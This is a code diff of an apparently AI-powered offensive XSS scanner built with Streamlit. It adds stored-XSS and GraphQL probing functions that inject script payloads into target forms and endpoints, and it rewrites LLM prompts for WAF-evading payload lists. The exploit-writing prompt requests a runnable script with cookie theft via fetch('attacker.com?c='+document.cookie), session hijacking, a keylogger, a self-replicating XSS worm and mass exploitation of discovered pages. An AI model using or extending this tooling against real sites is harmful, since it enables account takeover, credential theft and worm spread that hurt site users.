@@ -158,91 +158,88 @@ ICONS = {
     "hunt": "🔭", "skip": "⏭️",
 }
 
-_TERM_HEIGHT = 520   # px — iframe height
+_TERM_HEIGHT = 540   # px — iframe height
 
 def _build_terminal_html() -> str:
-    lines = st.session_state.log if st.session_state.log else ["Ready."]
-    safe  = "\n".join(
-        l.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-        for l in lines
+    raw_lines = st.session_state.log if st.session_state.log else ["Ready."]
+    count   = len(raw_lines)
+    body_h  = _TERM_HEIGHT - 40
+
+    # Render lines newest-first inside a column-reverse flex container.
+    # column-reverse means: first DOM child = visually at BOTTOM.
+    # scrollTop=0 (default) shows the bottom → newest lines always visible.
+    # User scrolls UP (scrollTop increases) to see older lines.
+    rows = "".join(
+        '<div class="ln">'
+        + l.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
+        + '</div>'
+        for l in reversed(raw_lines)
     )
-    count   = len(lines)
-    th      = _TERM_HEIGHT
-    body_h  = th - 38      # terminal body = total - toolbar
+
     return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
 <style>
 *{{box-sizing:border-box;margin:0;padding:0}}
-html,body{{height:{th}px;overflow:hidden;background:#0d1117;
+html,body{{height:{_TERM_HEIGHT}px;overflow:hidden;background:#0d1117;
   font-family:'Courier New',monospace;font-size:12.5px;color:#39ff14;}}
-#toolbar{{
+#tb{{
   display:flex;justify-content:space-between;align-items:center;
   background:#161b22;border-bottom:1px solid #238636;
-  padding:5px 12px;height:38px;
+  padding:4px 12px;height:40px;flex-shrink:0;
 }}
-#toolbar span{{color:#58a6ff;font-size:11px;}}
-#toolbar button{{
+#tb span{{color:#58a6ff;font-size:11px;}}
+#tb button{{
   background:none;border:1px solid #238636;color:#39ff14;
-  border-radius:4px;padding:2px 10px;cursor:pointer;
-  font-size:11px;margin-left:6px;font-family:'Courier New',monospace;
+  border-radius:4px;padding:2px 9px;cursor:pointer;
+  font-size:11px;margin-left:5px;font-family:'Courier New',monospace;
 }}
-#toolbar button:hover{{background:#238636;color:#fff;}}
+#tb button:hover{{background:#238636;color:#fff;}}
 #term{{
   height:{body_h}px;overflow-y:auto;
-  padding:12px 16px;white-space:pre-wrap;
-  line-height:1.6;scroll-behavior:smooth;
+  display:flex;flex-direction:column-reverse;
+  scroll-behavior:smooth;
 }}
-/* fullscreen: fill the whole viewport */
-:fullscreen #term{{ height:calc(100vh - 38px); }}
-:-webkit-full-screen #term{{ height:calc(100vh - 38px); }}
+.ln{{padding:0 16px;line-height:1.65;white-space:pre-wrap;word-break:break-all;}}
 </style></head><body>
-<div id="toolbar">
+<div id="tb">
   <span>💻 Agent Terminal &nbsp;·&nbsp; {count} lines</span>
   <span>
-    <button onclick="document.getElementById('term').scrollTop=0">⬆ Top</button>
-    <button onclick="document.getElementById('term').scrollTop=document.getElementById('term').scrollHeight">⬇ Bottom</button>
+    <button onclick="document.getElementById('term').scrollTop=document.getElementById('term').scrollHeight">⬆ Old</button>
+    <button onclick="document.getElementById('term').scrollTop=0">⬇ New</button>
     <button id="fsbtn" onclick="toggleFS()">⛶ Fullscreen</button>
   </span>
 </div>
-<div id="term">{safe}</div>
+<div id="term">{rows}</div>
 <script>
-// auto-scroll every time the iframe loads (i.e. on every terminal update)
-(function(){{
-  var t=document.getElementById('term');
-  t.scrollTop=t.scrollHeight;
-}})();
+/* column-reverse means scrollTop=0 IS the bottom (newest) — no JS needed for auto-scroll.
+   But we do reset it on each load just in case the browser starts elsewhere. */
+document.getElementById('term').scrollTop = 0;
 
 function toggleFS(){{
-  var fr=window.frameElement;
-  var t=document.getElementById('term');
-  var btn=document.getElementById('fsbtn');
-  if(!fr){{
-    // fallback: native fullscreen on the doc itself
-    var el=document.documentElement;
-    var fn=el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen;
-    if(fn)fn.call(el);
+  var fr = window.frameElement;
+  var t  = document.getElementById('term');
+  var btn= document.getElementById('fsbtn');
+  if (!fr) {{
+    var el = document.documentElement;
+    var fn = el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen;
+    if (fn) fn.call(el);
     return;
   }}
-  if(fr._xssFS){{
-    // restore
-    fr.style.cssText=fr._xssSaved||'';
-    fr._xssFS=false;
-    t.style.height='{body_h}px';
-    btn.textContent='⛶ Fullscreen';
-  }}else{{
-    // expand iframe to cover the parent viewport
-    fr._xssSaved=fr.style.cssText||'';
-    fr.style.cssText=[
-      'position:fixed','top:0','left:0',
-      'width:100vw','height:100vh',
-      'z-index:2147483647','border:none',
-      'background:#0d1117'
-    ].join('!important;')+'!important';
-    fr._xssFS=true;
-    t.style.height='calc(100vh - 38px)';
-    btn.textContent='✕ Exit Fullscreen';
-    t.scrollTop=t.scrollHeight;
-    // scroll parent to top so iframe is visible
-    try{{window.parent.scrollTo(0,0);}}catch(e){{}}
+  if (fr._xssFS) {{
+    ['position','top','left','width','height','z-index','border','background','max-width','max-height']
+      .forEach(function(p){{ fr.style.removeProperty(p); }});
+    fr._xssFS = false;
+    t.style.height = '{body_h}px';
+    btn.textContent = '⛶ Fullscreen';
+  }} else {{
+    [['position','fixed'],['top','0'],['left','0'],['width','100vw'],['height','100vh'],
+     ['z-index','2147483647'],['border','none'],['background','#0d1117'],
+     ['max-width','none'],['max-height','none']]
+      .forEach(function(kv){{ fr.style.setProperty(kv[0], kv[1], 'important'); }});
+    fr._xssFS = true;
+    t.style.height = 'calc(100vh - 40px)';
+    btn.textContent = '✕ Exit';
+    t.scrollTop = 0;
+    try{{ window.parent.scrollTo(0,0); }}catch(e){{}}
   }}
 }}
 </script>
@@ -250,7 +247,6 @@ function toggleFS(){{
 
 
 def _draw_terminal(ph):
-    """Render terminal into a Streamlit empty placeholder using st.html()."""
     ph.html(_build_terminal_html())
 
 
@@ -1106,78 +1102,246 @@ def _hunt_header_injection(target: str, term_ph, stats_phs) -> list:
     return hits
 
 
+# ── Stored XSS Hunting ────────────────────────────────────────────────────────
+def _hunt_stored_xss(pages: list, payloads: list, term_ph, stats_phs) -> list:
+    """
+    Real stored XSS detection:
+    1. Identify POST forms (likely storage endpoints)
+    2. Submit with a unique marker + XSS payload
+    3. Re-crawl ALL pages looking for the marker unescaped
+    4. Browser-verify via Playwright on the page where it appeared
+    """
+    import time as _time
+    hits = []
+    unique_id = f"xssprobe{int(_time.time())}"
+    storage_forms = [
+        (page, form)
+        for page in pages
+        for form in page.get("forms", [])
+        if form["method"] == "post"
+    ]
+    if not storage_forms:
+        log("No POST forms found — skipping stored XSS phase", "skip", term_ph, stats_phs)
+        return hits
+
+    log(f"Found {len(storage_forms)} POST form(s) — testing stored XSS", "hunt", term_ph, stats_phs)
+
+    for page, form in storage_forms[:8]:
+        base_data = {f["name"]: f.get("value", "test") for f in form.get("fields", [])}
+        for field in form.get("fields", [])[:4]:
+            fname = field["name"]
+            for payload in payloads[:6]:
+                marker = f"{unique_id}_{fname}"
+                data   = dict(base_data)
+                data[fname] = marker + payload
+
+                try:
+                    # Submit the form
+                    resp = requests.post(
+                        form["action"], data=data, headers=REQ_HEADERS,
+                        timeout=REQUEST_TIMEOUT, allow_redirects=True)
+                    log(f"  Stored probe → {form['action']} field={fname} status={resp.status_code}",
+                        "hunt", term_ph, stats_phs)
+                except Exception:
+                    continue
+
+                # Re-crawl all discovered pages looking for the marker
+                found_on = []
+                for check_page in pages:
+                    r2 = safe_req("get", check_page["url"])
+                    if r2 and marker in r2.text:
+                        ref = _check_reflection(r2.text, payload)
+                        if ref["reflected"] and not ref.get("escaped"):
+                            found_on.append((check_page["url"], r2.text, ref))
+                            break
+
+                if found_on:
+                    store_url, store_body, ref = found_on[0]
+                    log(f"  🎯 STORED — payload found on {store_url}", "vuln", term_ph, stats_phs)
+                    st.session_state.points_found += 1
+
+                    r_hit = {
+                        "url": store_url,
+                        "inject_url": form["action"],
+                        "param": fname,
+                        "payload": payload,
+                        "method": "stored-post",
+                        "status": 200,
+                        "reflected": True, "escaped": False, "partial": False,
+                        "context": f"STORED XSS — injected via {form['action']} field={fname}",
+                        "body_snippet": ref.get("snippet", store_body[:300]),
+                        "browser_confirmed": False,
+                        "severity": "CRITICAL — stored XSS persists for all visitors",
+                    }
+
+                    # Browser-verify
+                    if PLAYWRIGHT_OK:
+                        log(f"  ↳ Browser-verifying stored XSS on {store_url}...",
+                            "warn", term_ph, stats_phs)
+                        bv = verify_in_browser(store_url, fname, payload, "get")
+                        r_hit["browser_confirmed"] = bv["confirmed"]
+                        r_hit["screenshot"]        = bv.get("screenshot")
+                        r_hit["dialog_msg"]        = bv.get("dialog_msg")
+                        if bv["confirmed"]:
+                            st.session_state.vulns_found += 1
+                            log(f"  🎯 STORED XSS BROWSER CONFIRMED on {store_url}",
+                                "vuln", term_ph, stats_phs)
+                        else:
+                            st.session_state.vulns_found += 1
+                            log(f"  ⚠️ Stored (unescaped) but not confirmed in browser",
+                                "warn", term_ph, stats_phs)
+                    else:
+                        st.session_state.vulns_found += 1
+
+                    hits.append(r_hit)
+                    break  # next form field
+    return hits
+
+
+# ── GraphQL hunting ────────────────────────────────────────────────────────────
+def _hunt_graphql(target: str, pages: list, term_ph, stats_phs) -> list:
+    """Probe GraphQL endpoints, run introspection, inject XSS in string fields."""
+    hits = []
+    gql_candidates = ["/graphql", "/api/graphql", "/v1/graphql",
+                      "/gql", "/query", "/graphiql", "/playground"]
+    parsed_target = urllib.parse.urlparse(target)
+    base = f"{parsed_target.scheme}://{parsed_target.netloc}"
+
+    # Also check from discovered JS endpoints
+    js_eps = [ep for p in pages for ep in p.get("js_endpoints", [])]
+    gql_from_js = [ep for ep in js_eps if "graphql" in ep.lower() or "/gql" in ep.lower()]
+    endpoints_to_try = list({base + c for c in gql_candidates} | set(gql_from_js))
+
+    headers = dict(REQ_HEADERS)
+    headers["Content-Type"] = "application/json"
+    headers["Accept"]       = "application/json"
+
+    introspection = json.dumps({"query": "{ __schema { types { name fields { name } } } }"})
+    xss_query     = json.dumps({"query": '{ __typename @skip(if: false) }',
+                                 "variables": {"x": '<img src=x onerror=alert(1)>'}})
+
+    for ep in endpoints_to_try[:10]:
+        try:
+            resp = requests.post(ep, data=introspection, headers=headers,
+                                 timeout=REQUEST_TIMEOUT)
+            if resp.status_code == 200 and "__schema" in resp.text:
+                log(f"GraphQL endpoint found: {ep}", "vuln", term_ph, stats_phs)
+                # Try XSS in variables
+                for xss_pl in ['<img src=x onerror=alert(1)>', '"><script>alert(1)</script>']:
+                    xss_payload = json.dumps({
+                        "query": 'query($x:String){__typename}',
+                        "variables": {"x": xss_pl},
+                    })
+                    r2 = requests.post(ep, data=xss_payload, headers=headers,
+                                       timeout=REQUEST_TIMEOUT)
+                    if xss_pl in r2.text:
+                        hits.append({
+                            "url": ep, "param": "GraphQL variables",
+                            "payload": xss_pl, "method": "post",
+                            "status": r2.status_code,
+                            "reflected": True, "escaped": False, "partial": False,
+                            "context": "GraphQL variable reflection",
+                            "body_snippet": r2.text[:400],
+                            "browser_confirmed": False,
+                            "severity": "HIGH — GraphQL XSS in API response",
+                        })
+                        st.session_state.vulns_found += 1
+                        log(f"GraphQL XSS reflection: {ep}", "vuln", term_ph, stats_phs)
+                        break
+            elif resp.status_code in (200, 400) and "errors" in resp.text.lower():
+                log(f"GraphQL-like endpoint (errors in response): {ep}", "warn", term_ph, stats_phs)
+        except Exception:
+            pass
+    return hits
+
+
 # ── AI: payload generation ─────────────────────────────────────────────────────
 def ai_generate_payloads(client, target, user_payload, waf,
                           dom_sinks, template_engine, pages) -> list:
-    waf_note = ""
-    if waf:
-        waf_note = (
-            f"WAF DETECTED: {waf}. Generate payloads that bypass {waf}. "
-            f"Techniques: HTML entity encoding, URL double-encode, unicode escapes, "
-            f"null bytes, case variation (ScRiPt), comment insertion (/**/), "
-            f"tag attribute order tricks, SVG/MathML vectors, String.fromCharCode, atob()."
-        )
-    sink_note = ""
-    if dom_sinks:
-        sink_note = ("DOM SINKS — generate DOM-based XSS via:\n"
-                     + "\n".join(f"  {s}" for s in dom_sinks[:6])
-                     + "\nUse location.hash, document.URL, location.search, window.name as sources.")
-    engine_note = (f"TEMPLATE ENGINE: {template_engine} — include SSTI for {template_engine}."
-                   if template_engine else "")
+    # Build a detailed context summary for each injection point
+    ctx_blocks = []
+    for p in pages[:6]:
+        blk = f"URL: {p['url']}\n"
+        if p.get("params"):
+            blk += f"  GET params: {p['params']}\n"
+        for fm in p.get("forms", [])[:2]:
+            blk += (f"  Form {fm['method'].upper()} → {fm['action']} "
+                    f"fields={[x['name'] for x in fm['fields']]}\n")
+        if p.get("dom_sinks"):
+            blk += f"  DOM sinks:\n" + "\n".join(f"    {s[:80]}" for s in p["dom_sinks"][:3]) + "\n"
+        if p.get("inline_js"):
+            blk += f"  Inline JS (first 400c):\n{p['inline_js'][:400]}\n"
+        # Show HTML around reflection points
+        blk += f"  HTML snippet:\n{p['html'][:700]}\n"
+        ctx_blocks.append(blk)
+    page_ctx = "\n".join(ctx_blocks)
 
-    page_ctx = ""
-    for p in pages[:8]:
-        if p.get("forms") or p.get("params") or p.get("dom_sinks"):
-            page_ctx += f"\n=== {p['url']} ===\n"
-            if p.get("params"):
-                page_ctx += f"URL params: {p['params']}\n"
-            for f in p.get("forms", [])[:2]:
-                page_ctx += (f"Form → {f['action']} [{f['method']}] "
-                             f"fields: {[x['name'] for x in f['fields']]}\n")
-            if p.get("inline_js"):
-                page_ctx += f"Inline JS:\n{p['inline_js'][:600]}\n"
-            page_ctx += f"HTML:\n{p['html'][:900]}\n"
+    waf_tactics = {
+        "Cloudflare":  "Use unicode \\u003c, \\u003e; HTML entities; SVG vectors; atob(); tag case mix",
+        "AWS WAF":     "Use URL double-encoding, null bytes, comment breaks <!-/**/->, backtick template literals",
+        "ModSecurity": "Use multiline, \\x encoding, alternate event handlers, data: URIs",
+        "Akamai":      "Use unicode code points, attribute order randomization, exotic event handlers",
+        "Imperva":     "Use nested tags, CSS expression(), \\v escapes, attribute value splitting",
+        "Sucuri":      "Use SVG/MathML, HTML5 semantic tags with event handlers, encoded chars",
+        "Wordfence":   "Use template literals, atob() decoding, Function constructor, toString(36)",
+    }.get(waf or "", "Use encoding combinations, case mixing, tag splitting, unicode escapes")
 
-    prompt = f"""You are an elite offensive security researcher specializing in browser-exploitable XSS zero-days.
-Authorized penetration test. Generate payloads that ACTUALLY EXECUTE in a real browser.
+    prompt = f"""You are the world's best XSS researcher. Authorized penetration test against {target}.
+Study the ACTUAL HTML/JS context below and generate 32 payloads that are EXACTLY adapted to it.
 
-Target: {target}
-Desired injection: {user_payload}
-{waf_note}
-{sink_note}
-{engine_note}
+USER'S INTENDED INJECTION: {user_payload}
+WAF: {waf or 'none'} — bypass tactics: {waf_tactics}
+DOM SINKS PRESENT: {', '.join(dom_sinks[:5]) if dom_sinks else 'none'}
+TEMPLATE ENGINE: {template_engine or 'not detected'}
 
-PAGE CONTEXT (study for exact reflection points and escaping):
-{page_ctx[:3500]}
+=== PAGE CONTEXT (analyze every character) ===
+{page_ctx[:4000]}
 
-Generate exactly 28 payloads. Analyze the context carefully. Include:
-1. Exact context-adapted version of user payload
-2. Attribute breakout variants (close attr, inject event handlers)
-3. JS string escape variants (close quotes/backticks)
-4. HTML5: <details ontoggle>, <video onerror>, <audio onerror>, <input onfocus autofocus>
-5. mXSS — mutation XSS exploiting parser (<!--, <noscript>, <listing>)
-6. WAF bypass encodings (entities, URL, unicode, case, comments, tag splitting)
-7. Polyglots spanning HTML/JS/CSS/URL
-8. DOM XSS via hash/search/window.name if sinks present
-9. javascript: URL for href/src/action attributes
-10. <svg><script> namespaced injection
-11. CSS expression() / -moz-binding
-12. String.fromCharCode / atob() obfuscation
-13. Prototype pollution → XSS
-14. SSTI if template engine detected
-15. No-parentheses XSS: alert\`1\`, throw onerror=alert,1
-16. SVG animate/set event handlers
-17. Template literal injection for JS context
-18. Mutation: <form id=x><input name=action value=javascript:alert(1)>
+Generate payloads covering ALL these angles — be SPECIFIC to the contexts above:
 
-Output ONLY a raw JSON array. No markdown, no explanation."""
+TIER 1 — Exact context hits (most likely to work):
+- Adapt user payload EXACTLY to each HTML context found (HTML body / attr / JS / URL)
+- Break out of detected attribute quotes (look at which quote char is used in HTML above)
+- Escape detected JS string delimiters if input reflects inside a script block
+
+TIER 2 — HTML5 & exotic handlers:
+- <details open ontoggle=...>, <svg onload=...>, <body onpageshow=...>
+- <iframe srcdoc="...">, <object data="javascript:...">, <embed src="...">
+- <math><mtext></mtext><mglyph><image xlink:href="javascript:alert(1)">
+
+TIER 3 — Parser mutation (mXSS) — these bypass sanitizers:
+- Nesting <table><td>, <select><option>, <textarea> to break parser context
+- <!--<img src="--><img src=x onerror=alert(1)>
+- <noscript><p title="</noscript><img src=x onerror=alert(1)>
+- <listing>...</listing> context break
+
+TIER 4 — WAF bypass (must pass {waf or 'none'} specifically):
+- Entity encoding: &#x3C;script&#x3E;
+- Unicode: \u003cscript\u003e
+- atob() decoding: eval(atob('BASE64'))
+- String.fromCharCode: String.fromCharCode(97,108,101,114,116,40,49,41)
+- No-paren: onerror=alert`1`, throw onerror=alert,1
+- Tag splitting: <sc\x00ript>, <scr\nipt>
+
+TIER 5 — Second-order & chaining:
+- Prototype pollution: ?__proto__[innerHTML]=<img onerror=alert(1) src=1>
+- JSONP: alert(document.cookie)//
+- CSS injection: </style><script>alert(1)</script>
+- javascript: URI for href/src/action
+
+TIER 6 — Stored XSS optimized (survive server-side processing):
+- Null byte bypass: %00<script>alert(1)</script>
+- Double encoding: %253Cscript%253E
+- Unicode normalization: ＜script＞ (fullwidth chars)
+
+Output ONLY a raw JSON array of 32 strings. Zero markdown, zero explanation."""
 
     try:
         resp = client.chat.completions.create(
             model=MODEL_FAST,
             messages=[{"role": "user", "content": prompt}],
-            max_tokens=1500,
-            temperature=0.75,
+            max_tokens=2000,
+            temperature=0.8,
         )
         text = resp.choices[0].message.content.strip()
         text = re.sub(r"```[a-z]*\n?|```", "", text).strip()
@@ -1195,42 +1359,58 @@ Output ONLY a raw JSON array. No markdown, no explanation."""
 def ai_write_exploit(client, findings: list, target: str, blind_url: str) -> str:
     if not findings:
         return ""
-    best = next((f for f in findings if f.get("browser_confirmed")), findings[0])
-    blind_note = f"\nBlind XSS callback URL: {blind_url}" if blind_url else ""
-    prompt = f"""Write a complete Python exploit for this confirmed vulnerability. Authorized pentest.
+    confirmed = [f for f in findings if f.get("browser_confirmed")]
+    best = confirmed[0] if confirmed else findings[0]
+    all_vulns_summary = json.dumps([{
+        "url": f["url"], "param": f["param"], "payload": f["payload"],
+        "context": f.get("context",""), "method": f["method"],
+        "confirmed": f.get("browser_confirmed", False),
+    } for f in findings[:8]], indent=2)
+
+    prompt = f"""Write a COMPLETE, RUNNABLE Python exploit script for this authorized pentest.
 
 Target: {target}
-URL: {best['url']}
-Param: {best['param']}
-Method: {best['method'].upper()}
-Context: {best.get('context', 'HTML body')}
-Confirmed payload: {best['payload']}
-Response snippet:
-{best.get('body_snippet','')[:600]}
-Browser confirmed: {best.get('browser_confirmed', False)}
-Dialog: {best.get('dialog_msg','')}
-{blind_note}
+All vulnerabilities found:
+{all_vulns_summary}
 
-Write Python (requests library). Demonstrate:
-1. Send payload, verify unescaped reflection
-2. Cookie theft via fetch exfiltration
-3. Session hijacking steps
-4. Keylogger payload injection
-5. Stored XSS escalation if applicable
-6. Multiple payload variants for the specific context
-7. WAF bypass if applicable
+Best confirmed finding:
+  URL: {best['url']}
+  Param: {best['param']}
+  Method: {best['method'].upper()}
+  Context: {best.get('context','HTML body')}
+  Working payload: {best['payload']}
+  Browser confirmed: {best.get('browser_confirmed', False)}
+  Snippet: {best.get('body_snippet','')[:400]}
+{"Blind callback: " + blind_url if blind_url else ""}
 
-Only output Python code, no markdown."""
+Write a COMPLETE Python script that:
+
+1. MODULE: Verify — HTTP GET/POST, check payload reflects unescaped, print PASS/FAIL
+2. MODULE: Cookie Theft — inject fetch("attacker.com?c="+document.cookie) payload, show HTTP server to receive
+3. MODULE: Session Hijack — steal cookie, use it to make authenticated requests as victim
+4. MODULE: Keylogger — inject payload that sends keystrokes to attacker server
+5. MODULE: Stored XSS persistence — if stored vuln exists, inject a script that also re-injects itself (worm)
+6. MODULE: Admin escalation — if any admin panel detected, try stored XSS there for max impact
+7. MODULE: Payload generator — auto-generate 10 WAF bypass variants of the working payload
+8. MODULE: Mass exploitation — iterate through discovered pages and inject in all vulnerable params
+
+Use: requests, argparse, http.server, base64, threading
+Include: argparse CLI so each module can be run independently (--verify, --steal-cookies, etc.)
+Comments explain exactly what each section does and why.
+Make it realistic — real pentesters would use this script.
+
+Output ONLY raw Python code. No markdown fences."""
+
     try:
         resp = client.chat.completions.create(
             model=MODEL_FAST,
             messages=[{"role": "user", "content": prompt}],
-            max_tokens=MAX_TOKENS, temperature=0.1,
+            max_tokens=2500, temperature=0.05,
         )
         return re.sub(r"```python\n?|```", "",
                       resp.choices[0].message.content.strip()).strip()
     except Exception as e:
-        return f"# Error: {e}"
+        return f"# Error generating exploit: {e}"
 
 
 # ── AI: security report ────────────────────────────────────────────────────────
@@ -1437,32 +1617,44 @@ def run_agent(target, user_payload, max_depth, blind_url, term_ph, stats_phs):
     for i, pl in enumerate(payloads[:6], 1):
         L(f"  [{i}] {pl[:100]}", "cmd")
 
-    # Phase 3 — Basic Injection Testing
+    # Phase 3 — Reflected XSS Testing
     L("━" * 50)
-    L("PHASE 3 — INJECTION TESTING", "info")
+    L("PHASE 3 — REFLECTED XSS TESTING", "info")
     all_findings = []
     for page in pages:
         hits = test_page(page, payloads, term_ph, stats_phs)
         all_findings.extend(hits)
-    L(f"Tested {st.session_state.points_found} injection points | "
-      f"{len([f for f in all_findings if f.get('browser_confirmed')])} browser-confirmed", "ok")
+    confirmed_3 = [f for f in all_findings if f.get("browser_confirmed")]
+    L(f"Tested {st.session_state.points_found} injection pts | "
+      f"{len(confirmed_3)} browser-confirmed | {len(all_findings)-len(confirmed_3)} reflected-only", "ok")
 
-    # Phase 3.5 — Advanced Zero-Day Hunting
+    # Phase 3.5 — Stored XSS Hunting
     L("━" * 50)
-    L("PHASE 3.5 — ADVANCED ZERO-DAY HUNTING", "hunt")
+    L("PHASE 3.5 — STORED XSS HUNTING", "hunt")
+    L("  Injecting markers into POST forms and re-crawling for persistence...", "hunt")
+    stored_hits = _hunt_stored_xss(pages, payloads, term_ph, stats_phs)
+    if stored_hits:
+        L(f"  {len(stored_hits)} stored XSS candidate(s) found!", "vuln")
+    else:
+        L("  No stored XSS found via POST forms", "info")
+    all_findings += stored_hits
+
+    # Phase 4 — Advanced Zero-Day Hunting
+    L("━" * 50)
+    L("PHASE 4 — ADVANCED ZERO-DAY HUNTING", "hunt")
 
     advanced_hits = []
 
-    L("  › Cache poisoning via unkeyed headers...", "hunt")
+    L("  › Cache poisoning (unkeyed headers)...", "hunt")
     advanced_hits += _hunt_cache_poisoning(target, term_ph, stats_phs)
 
-    L("  › Open redirect → javascript: URL injection...", "hunt")
+    L("  › Open redirect → javascript: URL...", "hunt")
     advanced_hits += _hunt_open_redirect(pages, term_ph, stats_phs)
 
     L("  › JSONP callback injection...", "hunt")
     advanced_hits += _hunt_jsonp(pages, term_ph, stats_phs)
 
-    L("  › Prototype pollution vectors...", "hunt")
+    L("  › Prototype pollution...", "hunt")
     advanced_hits += _hunt_prototype_pollution(target, pages, term_ph, stats_phs)
 
     L("  › JSON API body injection...", "hunt")
@@ -1471,29 +1663,34 @@ def run_agent(target, user_payload, max_depth, blind_url, term_ph, stats_phs):
     L("  › HTTP header injection...", "hunt")
     advanced_hits += _hunt_header_injection(target, term_ph, stats_phs)
 
-    L("  › DOM XSS via browser (hash/search source tracing)...", "hunt")
-    advanced_hits += _hunt_dom_xss_playwright(
-        target, pages, payloads, term_ph, stats_phs)
+    L("  › GraphQL introspection + injection...", "hunt")
+    advanced_hits += _hunt_graphql(target, pages, term_ph, stats_phs)
+
+    L("  › DOM XSS via Playwright (hash/search sources)...", "hunt")
+    advanced_hits += _hunt_dom_xss_playwright(target, pages, payloads, term_ph, stats_phs)
 
     if advanced_hits:
         L(f"Advanced hunt: {len(advanced_hits)} additional finding(s)", "ok")
     else:
-        L("Advanced hunt: no additional reflections found", "info")
+        L("Advanced hunt: no additional attack vectors confirmed", "info")
 
     all_findings += advanced_hits
     st.session_state.findings = all_findings
 
-    # Phase 4 — Exploit
-    if any(f.get("browser_confirmed") for f in all_findings):
+    total_confirmed = len([f for f in all_findings if f.get("browser_confirmed")])
+    L(f"Total: {len(all_findings)} findings | {total_confirmed} browser-confirmed", "ok")
+
+    # Phase 5 — Exploit Script Generation
+    if all_findings:
         L("━" * 50)
-        L("PHASE 4 — EXPLOIT GENERATION", "ai")
+        L("PHASE 5 — WRITING CUSTOM EXPLOIT SCRIPTS", "ai")
         exploit = ai_write_exploit(client, all_findings, target, blind_url)
         st.session_state.exploit_code = exploit
-        L("Python exploit script generated", "ok")
+        L("Standalone Python exploit script generated (see Exploit Code tab)", "ok")
 
-    # Phase 5 — Report
+    # Phase 6 — Report
     L("━" * 50)
-    L("PHASE 5 — AI SECURITY REPORT", "ai")
+    L("PHASE 6 — AI SECURITY REPORT", "ai")
     report = ai_full_report(
         client, all_findings, pages, target, all_sinks,
         waf, header_issues, eng, pm_handlers, advanced_hits)
